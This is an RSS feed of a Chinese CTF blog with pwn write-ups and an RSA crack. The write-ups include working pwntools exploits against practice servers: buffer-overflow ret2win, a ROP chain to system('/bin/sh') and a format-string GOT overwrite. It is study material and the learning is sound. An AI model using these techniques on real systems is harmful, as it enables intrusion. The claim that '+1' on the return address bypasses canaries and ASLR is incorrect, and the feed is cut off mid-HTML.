<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>cj_li&#39;s blog</title>
    <link>https://cjliblog.top/</link>
    
    <image>
      <url>https://www.gravatar.com/avatar/9a30667a06f9e54b4502c81e69456aa3</url>
      <title>cj_li&#39;s blog</title>
      <link>https://cjliblog.top/</link>
    </image>
    
    <atom:link href="https://cjliblog.top/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>新的开始</description>
    <pubDate>Sun, 27 Aug 2023 13:45:57 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>pwn刷题记录之hgame mini</title>
      <link>https://cjliblog.top/2023/08/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bhgame%20mini/</link>
      <guid>https://cjliblog.top/2023/08/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bhgame%20mini/</guid>
      <pubDate>Sat, 26 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<p><em>date：20230827</em></p><h2 id="Introduce-yourself-again——pwn"><a href="#Introduce-yourself-again——pwn" class="headerlink" title="Introduce yourself again——pwn"></a>Introduce yourself again——pwn</h2><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&#x27;../vuln&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;1.container.jingsai.apicon.cn&#x27;</span>,<span class="number">31583</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 /bin/sh 在你的二进制文件或 libc 中</span></span><br><span class="line">binsh_addr = <span class="built_in">next</span>(binary.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="comment"># next用于将迭代器转化为地址。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你的二进制文件导入了 system 函数，否则你需要从 libc 中找到它</span></span><br><span class="line">system_addr = binary.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造ROP链</span></span><br><span class="line">rop_chain = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span>  <span class="comment"># 填充缓冲区（32+8）</span></span><br><span class="line">rop_chain += p64(<span class="number">0x401283</span>)  <span class="comment"># pop rdi ; ret 的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># return到了rdi之后，转到&#x27;system(&#x27;/bin/sh&#x27;)&#x27;</span></span><br><span class="line">rop_chain += p64(binsh_addr)         <span class="comment"># /bin/sh 的地址</span></span><br><span class="line">rop_chain += p64(system_addr)        <span class="comment"># system 函数的地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(rop_chain)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ez-RSA——cypto"><a href="#ez-RSA——cypto" class="headerlink" title="ez_RSA——cypto"></a>ez_RSA——cypto</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> isqrt, invert</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"></span><br><span class="line">n = <span class="number">90938392456291254525076945024729747747760465730974669418706248227861886309375529663735627415245417634394729586919547147792773340180198391198314430274518933727253498184961383171260516587457792799707287325039224408079898775410581161837617160304998792211064631247289074677708936697313549567484094343014332084339</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">45364797306235971944260226800635151351008146862295270630931485461400677931474845001179392584827173887899973869918030404844235023951265629425837039670402124263530793496501526611946694844071734068320021250788698711162051512227685780168559259017820474609757591818839612837707915716391578907729532072964242156512</span></span><br><span class="line"></span><br><span class="line">x = isqrt(n)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> (isprime(x) <span class="keyword">and</span> isprime(n//x)):</span><br><span class="line">    x-=<span class="number">1</span></span><br><span class="line">p = x</span><br><span class="line">q = n // x</span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = invert(e, phi_n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the number to bytes</span></span><br><span class="line">b_res = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode the bytes to a string using UTF-8 encoding</span></span><br><span class="line">str_res = b_res.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str_res)</span><br></pre></td></tr></table></figure><p>（迟点再来更新）</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF做题记录</category>
      
      
      <comments>https://cjliblog.top/2023/08/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bhgame%20mini/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwn刷题记录 2</title>
      <link>https://cjliblog.top/2023/08/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%202/</link>
      <guid>https://cjliblog.top/2023/08/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%202/</guid>
      <pubDate>Fri, 25 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="pwn1-sctf-2016-1"><a href="#pwn1-sctf-2016-1" class="headerlink" title="pwn1_sctf_2016  1"></a>pwn1_sctf_2016  1</h2><p>0826</p><h4 id="1-分析"><a href="#1-分析" class="headerlink" title="1.分析"></a>1.分析</h4><p>IDA打开，vuln函数，代码比较长，就不直接展示了。</p><p>捕捉到关键信息如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">;此处定义一个<span class="number">32</span>位的字符型s数组，同时可以注意到它距离ebp有<span class="number">3</span>Ch的距离，为<span class="number">60</span>位。</span><br><span class="line"></span><br><span class="line"><span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">;这是一个fgets，相对于gets要安全，限定了输入的长度<span class="number">32</span>位</span><br><span class="line"></span><br><span class="line">std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">;一个“you”字符串引人注意</span><br><span class="line"></span><br><span class="line">std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">;一个“I”字符串引人注意</span><br><span class="line"></span><br><span class="line"><span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">;引人猜测有发生replace。点进replace，乱七八糟，懒得看。</span><br></pre></td></tr></table></figure><p>由于伪代码会出现很多乱七八糟的东西，这个时候就需要选择性忽略。</p><p>另外，看代码属于静态，我们还可以去进行动态的调试，来快速理解题目功能。</p><p>在ubuntu的terminal中，安装C++文件依赖：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install lib32stdc++6</span><br></pre></td></tr></table></figure><p>执行文件，输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">youyouyouIII111</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">So, youyouyouyouyouyou111</span><br></pre></td></tr></table></figure><p>发现“I”全都替换成了“you”。</p><p>说明我只要输一字符“I”就可以获得三字符的“you”，</p><p>因此需要尝试爆破的话，距离ebp60位，只需要20个“I”就可以解决。</p><p>此外，我们ebp是4位，需要再来一个“I”和一个其他字符<strong>或</strong>四个其他字符。</p><p>另外，发现一个后门函数是get_flag：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048F13                 mov     dword ptr [esp], offset command ; &quot;cat flag.txt&quot;</span><br></pre></td></tr></table></figure><p>地址为：0x8048F13</p><p>理论可行，实操开始。</p><h4 id="2-实操"><a href="#2-实操" class="headerlink" title="2.实操"></a>2.实操</h4><p>Ubuntu中打开code，代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26361</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">21</span>  + <span class="string">b&#x27;a&#x27;</span>  + p32(<span class="number">0x8048F13</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>over。</p><h2 id="jarvisoj-level0-1"><a href="#jarvisoj-level0-1" class="headerlink" title="jarvisoj_level0  1"></a>jarvisoj_level0  1</h2><p>0827</p><p>前面做了这么多，这题有点过于老套了。</p><p>1.分析</p><p>IDA:</p><p>注意vulnerable_function和callsystem这两个函数。</p><p>其中vulnerable_function如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很经典，考虑 80h buf + 8h rbp</p><p>另外callsystem中轻易获得唤起控制台地址。</p><p>2.代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25124</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * (<span class="number">128</span>+<span class="number">8</span>)   + p64(<span class="number">0x40059A</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="第五空间2019-决赛-PWN5-1"><a href="#第五空间2019-决赛-PWN5-1" class="headerlink" title="[第五空间2019 决赛]PWN5  1"></a>[第五空间2019 决赛]PWN5  1</h2><p>0827</p><h4 id="1-尝试"><a href="#1-尝试" class="headerlink" title="1.尝试"></a>1.尝试</h4><p>使用checksec：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>注意到有<strong>Canary</strong>，溢出有保护。</p><p><strong>NX</strong>开启，说明栈中数据没有执行权限。</p><p>运行程序，初步尝试。</p><h4 id="2-分析"><a href="#2-分析" class="headerlink" title="2.分析"></a>2.分析</h4><p>用IDA32位，打开，关键部分如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line"><span class="comment">//buf距离ebp7*16=112，而buf占100位</span></span><br><span class="line"><span class="comment">//nptr距离ebp 80h，即在buf下面占12位。</span></span><br><span class="line"></span><br><span class="line">v1 = time(<span class="number">0</span>);</span><br><span class="line">srand(v1);</span><br><span class="line">fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 使用种子以后，产生随机数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(fd, &amp;unk_804C044, <span class="number">4u</span>);</span><br><span class="line"><span class="comment">//把随机数写入unk_804C044所指向的地址，占四个字节，u表示这是一个无符号整数。</span></span><br><span class="line"><span class="comment">//unk_804C044存在于bss段，无法直接获取。</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line"><span class="comment">// buf到栈底的长度有0x70h，但是我们只能输入 0x63h，也就是我们无法在这里溢出</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(&amp;buf);</span><br><span class="line"><span class="comment">// printf函数输出了刚才输入的东西，而没有PIE，可以使用格式化字符串攻击。</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line"><span class="comment">// 同理，在这里我们也无法在这里溢出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( atoi(&amp;nptr) == unk_804C044 )&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/*此处判断条件是利用的关键点，上述有两次read，有以下两种方案：</span></span><br><span class="line"><span class="comment">1.第一次read将unk_804C044的值利用%n改成一个已知数，第二次read再将已知数传给nptr，满足判断条件，执行puts(&quot;ok!!&quot;);  和  system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="comment">2.第一次read将atoi函数直接改为执行system函数，第二次read将nptr改成&quot;/bin/sh&quot;，于是执行system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>注：<strong>BSS（Block Started by Symbol）</strong>代表了程序未初始化的全局变量和静态变量的存储区域。</p><h4 id="3-代码"><a href="#3-代码" class="headerlink" title="3.代码"></a>3.代码</h4><h5 id="方法一：篡改unk-804C044的值"><a href="#方法一：篡改unk-804C044的值" class="headerlink" title="方法一：篡改unk_804C044的值"></a>方法一：篡改unk_804C044的值</h5><p>以下确定输入的字符串偏移量：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="string">&#x27;./pwn&#x27;</span> </span><br><span class="line"></span><br><span class="line">your name:abcd 1:%p 2:%p 3:%p 4:%p 5:%p 6:%p 7:%p 8:%p 9:%p 10:%p 11:%p</span><br><span class="line">Hello,abcd 1:0xffc7ea48 2:0x63 3:(nil) 4:0xf7fd1ba0 5:0x3 6:0xf7f927b0 7:0x1 8:(nil) 9:0x1 10:0x64636261 11:0x32207025</span><br></pre></td></tr></table></figure><p>通过这个测试，我们知道abcd被存储在参数列表中第十个参数的位置。（a的ascii码是61）</p><p>IDA中可以找到unk_804C044的地址就是0x804C044</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804C044 dword_804C044   dd ?                    ; DATA XREF: main+77↑o</span><br></pre></td></tr></table></figure><p>printf函数的一个漏洞就是可以借助**%n**写入数据。</p><p>python代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29326</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + <span class="string">b&#x27;%10$n&#x27;</span> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x804c044占4字节</span></span><br><span class="line"><span class="string">&#x27;%n&#x27;在printf()中表示，将已输出的字符数写入到参数指向的位置。</span></span><br><span class="line"><span class="string">而经过上述测试，我们知道第十个参数指向的地址，就是我们输入的地址0x804c044</span></span><br><span class="line"><span class="string">10$就代表写入第十个参数。</span></span><br><span class="line"><span class="string">不要忘记添加&#x27;b&#x27;，否则发送str会报错。</span></span><br><span class="line"><span class="string">写入了值  b&#x27;4&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;your name:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#以上两种方法都是收到提示后发送。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h5 id="方法二：将atoi函数直接改为执行system函数"><a href="#方法二：将atoi函数直接改为执行system函数" class="headerlink" title="方法二：将atoi函数直接改为执行system函数"></a>方法二：将atoi函数直接改为执行system函数</h5><p>python代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#elf是可执行文件的意思。</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26396</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_plt_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">format_string_offset = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(format_string_offset,&#123;atoi_got_addr:system_plt_addr&#125;)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;your name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;your passwd:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#结束要记得添加字符串结束符。</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>解释一下一些知识盲区：</p><ol><li><p><strong><code>atoi_got_addr = elf.got[&#39;atoi&#39;]</code></strong>:</p><ul><li>这行代码从当前程序的**全局偏移表(GOT)**中提取了<code>atoi</code>函数的地址。GOT是一个在运行时由动态链接器维护的表，用于存储每个外部函数（如来自共享库的函数）的实际地址。</li><li>当程序第一次调用一个外部函数时，它实际上是通过GOT的对应条目来调用的。在程序第一次调用该函数后，动态链接器将填充该函数的实际地址到GOT。</li><li>由于GOT存放在已知的地址，并且可能在程序的生命周期中被修改，因此它经常成为二进制漏洞利用的目标。</li></ul></li><li><p><strong><code>system_plt_addr = elf.plt[&#39;system&#39;]</code></strong>:</p><ul><li>这行代码从程序的**过程链接表(PLT)**中提取了<code>system</code>函数的地址。PLT是一个存放跳转指令的表，它在程序第一次调用一个外部函数时使用。</li><li>当程序尝试调用一个还未解析的外部函数时，它首先跳转到PLT中的对应条目。然后，PLT条目将使用GOT中的信息来跳转到实际的函数地址（或者调用动态链接器来解析它）。</li></ul></li><li><p><strong><code>format_string_offset = 10</code></strong>:</p><ul><li>这声明了一个变量，表示我们预计格式化字符串开始的位置是第10个参数。这通常是通过测试和实验来确定的。</li></ul></li><li><p><strong><code>payload = fmtstr_payload(format_string_offset, &#123;atoi_got_addr: system_plt_addr&#125;)</code></strong>:</p><ul><li><code>fmtstr_payload</code>是<code>pwnlib</code>库中的一个函数，用于生成格式化字符串攻击的payload。</li><li>第一个参数（<code>format_string_offset</code>）告诉函数格式化字符串在参数列表中的位置。</li><li>第二个参数是一个字典，描述了应修改哪些地址及其新的值。在这里，我们想将<code>atoi</code>的GOT条目改为<code>system</code>函数的PLT地址。换句话说，我们想在下次程序调用<code>atoi</code>函数时实际上执行<code>system</code>函数。</li></ul></li></ol><p>该攻击涉及到重写GOT中的<code>atoi</code>函数地址，使其指向<code>system</code>函数或其他恶意代码。这样，下次程序尝试调用<code>atoi</code>时，它实际上会执行攻击者选择的代码。</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF做题记录</category>
      
      
      <comments>https://cjliblog.top/2023/08/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%202/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwn刷题记录（连载）</title>
      <link>https://cjliblog.top/2023/08/25/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BF%9E%E8%BD%BD%EF%BC%89/</link>
      <guid>https://cjliblog.top/2023/08/25/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BF%9E%E8%BD%BD%EF%BC%89/</guid>
      <pubDate>Thu, 24 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<p>注：可用目录快速导航。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然算法题依然重要，但我已决定走向CTF之路。</p><p>前不久我开始探索WEB安全，但遗憾的是我忘记了在我的博客上记录学习的过程。</p><p>目前，我更对自己的定位是misc选手，但对web和pwn也有一定的了解。</p><p>在比赛中，除了自己擅长的领域，我也能在其他领域为团队贡献力量。</p><p>为了更系统地学习pwn，我决定从基础开始，尽管可能会进展较慢。</p><p>同时，我也希望通过记录自己的学习和挑战过程来培养一种良好的习惯。</p><p>以下从buuctf开始。</p><h2 id="test-your-nc1"><a href="#test-your-nc1" class="headerlink" title="test_your_nc1"></a>test_your_nc1</h2><p>2023-08-23</p><h4 id="1-操作"><a href="#1-操作" class="headerlink" title="**1.**操作"></a>**1.**操作</h4><p>一个在搭建好环境后就可以完成的入门题。</p><p>启动靶机，打开ubuntu，terminal，直接输入nc去连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc node4.buuoj.cn 29757</span><br><span class="line"><span class="comment">#端口号按照自己的靶机改</span></span><br></pre></td></tr></table></figure><h4 id="2-获取flag"><a href="#2-获取flag" class="headerlink" title="**2.**获取flag"></a>**2.**获取flag</h4><p>输入ls，看到了flag，输入cat flag，得到flag。</p><h2 id="rip1"><a href="#rip1" class="headerlink" title="rip1"></a>rip1</h2><p>2023-08-24</p><h4 id="1-分析："><a href="#1-分析：" class="headerlink" title="**1.**分析："></a>**1.**分析：</h4><p>先把vuln放在ubuntu的桌面，在桌面打开terminal，输入“checksec vuln”来检查它是否受保护。</p><p>把vuln在ubuntu中拖入terminal进行玩耍，他会要求输入一些东西，</p><p>比如输入一个123试试，感受一下它的交互。</p><p>将附件vuln拖入windows的IDA分析，需要注意的函数有：main函数 和 <strong>列表中</strong>main下面的fun函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数中，我们注意gets函数是一个危险函数，它对字符串的输入是可以无限长，然后溢出的，而溢出正是pwn的主线。</p><p>其中s数组是关键，我们点开s进行查看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-000000000000000F s               db ?</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C                 db ? ; undefined</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004                 db ? ; undefined</span><br><span class="line">-0000000000000003                 db ? ; undefined</span><br><span class="line">-0000000000000002                 db ? ; undefined</span><br><span class="line">-0000000000000001                 db ? ; undefined</span><br></pre></td></tr></table></figure><p>我们会看到这样一段s数组的存储空间，从1到15编号，因此我们需要输入15个字符就可以把数组s填满。</p><p>另外，在main的IDA视图开头，我们看到了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br></pre></td></tr></table></figure><p>说明rbp被先压进去了，我们需要把rbp也填充满。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此函数中，&#x2F;bin&#x2F;sh是个经典shell，是我们获取控制权的关键。</p><p>分析完毕，开始编写代码</p><h4 id="3-python脚本的编写"><a href="#3-python脚本的编写" class="headerlink" title="**3.**python脚本的编写"></a>**3.**python脚本的编写</h4><p>在ubuntu中使用vscode</p><p>创建一个文件夹，创建文件1.py</p><p>整理后如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用pwntool工具，*表示调入所有内容。</span></span><br><span class="line"><span class="comment">#在这之前需要安装pwntool包，以下函数基本都是pwntool中的</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh链接node4.buuoj.cn:25521靶机。</span></span><br><span class="line"><span class="comment">#注意使用空格使代码美观，增加代码可读性</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25521</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#负载，b表示使用byte类型，（pwntools一般都是用byte操作）将数组s用15个A</span></span><br><span class="line"><span class="comment">#填充rbp，64位需要8个字符（一个字符8位），32位需要4个字符</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x401186</span>+<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p64函数表示转化为六十四位byte，而括号里是fun函数的地址（IDA视图有注释）</span></span><br><span class="line"><span class="string">+1是为了绕过一些安全机制，如栈溢出保护（Stack Canaries）或地址空间布局随机化（ASLR）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">当 ASLR 机制开启时，系统会将函数的地址随机化，使得攻击者很难准确预测函数地址的位置。通过在返回地址中加上一个常数（如 +1），攻击者可以试图绕过随机化，使攻击更加稳定。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#发送函数</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#暂停并进入交互的函数</span></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另外，如果是执着于本地调试，我们可以这样：</p><figure class="highlight python"><table><tr><td 